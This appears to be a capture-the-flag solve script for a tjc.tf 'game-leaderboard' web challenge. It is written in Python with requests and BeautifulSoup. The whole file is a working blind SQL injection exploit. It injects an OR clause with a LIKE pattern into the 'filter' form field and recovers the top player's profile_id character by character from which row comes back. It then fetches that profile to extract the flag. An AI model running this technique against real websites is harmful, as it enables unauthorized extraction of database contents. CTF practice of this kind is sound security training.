import requests
from bs4 import BeautifulSoup
import re

with requests.Session() as session:
    r = session.get("https://game-leaderboard.tjc.tf/")
    bs = BeautifulSoup(r.text, 'html.parser')
    rank1_name = bs.select("#table-body > tr:nth-child(1) > td:nth-child(2)")[0].text

    NUMBERS = "0123456789abcdef"
    known = ""

    while True:
        for n in NUMBERS:
            guess = f'{known}{n}%'
            query = f"100 or CAST(profile_id AS TEXT) like '{guess}'"
            params = {'filter': query}
            r = session.post("https://game-leaderboard.tjc.tf/", data=params)
            bs = BeautifulSoup(r.text, 'html.parser')
            try:
                name = bs.select("#table-body > tr:nth-child(1) > td:nth-child(2)")[0].text
                if name != rank1_name:
                    continue
            except IndexError:
                # Not Found
                continue
            print(guess)
            known += n
            break
        else:
            break
    print(known)

    r = session.get(f"https://game-leaderboard.tjc.tf/user/{known}")
    print(re.findall(r'tjctf\{.*\}', r.text))
